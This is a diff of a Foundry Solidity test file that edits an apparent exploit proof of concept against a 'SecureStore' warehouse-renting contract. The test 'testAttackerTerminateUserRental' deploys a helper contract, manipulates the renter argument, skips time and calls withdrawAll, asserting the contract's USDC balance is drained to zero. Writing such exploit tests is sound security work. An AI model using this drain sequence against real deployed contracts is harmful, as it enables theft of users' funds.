@@ -26,7 +26,7 @@ contract Call2Test is Test {
         vm.startPrank(deployerAddress);
         // Setup instance of the contract
         rentingLibrary = new RentingLibrary();
-        // deploy an instance of USDC token contract using the IERC20 interface
+        // deploy an instance of USDC token contract using our MockERC20
         usdc = new usdcErc20();
         // need usdc address so secureStore is last
         secureStore = new SecureStore(address(rentingLibrary),PRICE, address(usdc));
@@ -74,7 +74,6 @@ contract Call2Test is Test {
         // call rentWarehouse() which will attempt to transfer USDC before we aprove SecureStore to spend USDC for max uint256
         secureStore.rentWarehouse(USDC_AMOUNT / PRICE, 1);
         vm.stopPrank();
-        // assertEq(usdc.balanceOf(address(secureStore)), USDC_AMOUNT + contractUsdcBalance);
     }
 
     function testAttackerTerminateUserRental() public {
@@ -91,7 +90,6 @@ contract Call2Test is Test {
         uint256 attackerStartingBal = usdc.balanceOf(attacker);
         uint256 secureStorStaringBal = usdc.balanceOf(address(secureStore));
         ThisIsNothing thisIsNothing = new ThisIsNothing(address(secureStore), address(usdc));
-        // call rentWarehouse() with thisIsNothing as the new currentRenter
         uint256 addressToUint = uint160(address(thisIsNothing));
         // assembly {
         //     addressToUint := thisIsNothing
@@ -101,12 +99,11 @@ contract Call2Test is Test {
         secureStore.rentWarehouse(1, addressToUint);
         // 2 days == 172800 seconds
         skip(172810);
+        vm.expectEmit(false, false, false, true);
+        emit RentedFor(0);
         secureStore.rentWarehouse(0, uint256(uint160(address(attacker))));
         secureStore.withdrawAll();
         vm.stopPrank();
-        // emit log_named_uint("EOA balance", usdc.balanceOf(attacker));
-        // emit log_named_uint("deployer balance", usdc.balanceOf(deployerAddress));
-        // emit log_named_uint("user balance", usdc.balanceOf(userAddress));
         emit log_named_uint("Attacker", usdc.balanceOf(attacker));
         emit log_named_uint("Bank", usdc.balanceOf(address(secureStore)));
         assertEq(usdc.balanceOf(address(secureStore)), 0);
